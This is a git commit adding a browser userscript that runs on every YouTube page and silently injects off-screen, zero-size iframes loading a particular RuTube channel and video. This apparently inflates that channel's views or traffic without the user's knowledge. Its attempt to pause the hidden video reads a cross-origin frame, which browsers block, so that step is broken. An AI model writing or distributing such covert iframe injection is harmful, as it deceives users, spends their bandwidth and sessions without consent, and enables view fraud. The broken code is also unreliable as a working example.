26cb9131a38852e695c02f44b92e22b22a2a8015
GAFur <49081172+ilfae@users.noreply.github.com>
2024-08-07 02:22:54 +0400

    Add files via upload

---
+++ Background RuTube Video-0.0.user.js
@@ -0,0 +1,43 @@
+// ==UserScript==
+// @name               Background RuTube Video
+// @match              https://www.youtube.com/*
+// @grant              none
+// @license            MIT
+// @compatible         firefox
+// @compatible         chrome
+// @compatible         opera
+// @compatible         safari
+// @compatible         edge
+// ==/UserScript==
+
+(function() {
+    // Функция для создания скрытого iframe
+    function createHiddenIframe(url) {
+        const iframe = document.createElement('iframe');
+        iframe.src = url;
+        iframe.style.width = '0';
+        iframe.style.height = '0';
+        iframe.style.border = 'none';
+        iframe.style.position = 'absolute';
+        iframe.style.top = '-9999px';
+        iframe.style.left = '-9999px';
+        document.body.appendChild(iframe);
+        return iframe;
+    }
+
+    // Если открыта главная страница YouTube или любая страница на YouTube
+    if (window.location.href.match(/https:\/\/www\.youtube\.com\/.*$/)) {
+        createHiddenIframe('https://rutube.ru/channel/1713375/');
+    }
+
+    // Если открыта конкретная страница с видео на YouTube
+    if (window.location.href.match(/https:\/\/www\.youtube\.com\/watch.*$/)) {
+        const videoIframe = createHiddenIframe('https://rutube.ru/video/ce45c787a5be026712116b137723005c/');
+        videoIframe.onload = function() {
+            const rutubeVideo = videoIframe.contentWindow.document.querySelector('video');
+            if (rutubeVideo) {
+                rutubeVideo.pause(); // Останавливаем воспроизведение видео
+            }
+        };
+    }
+})();
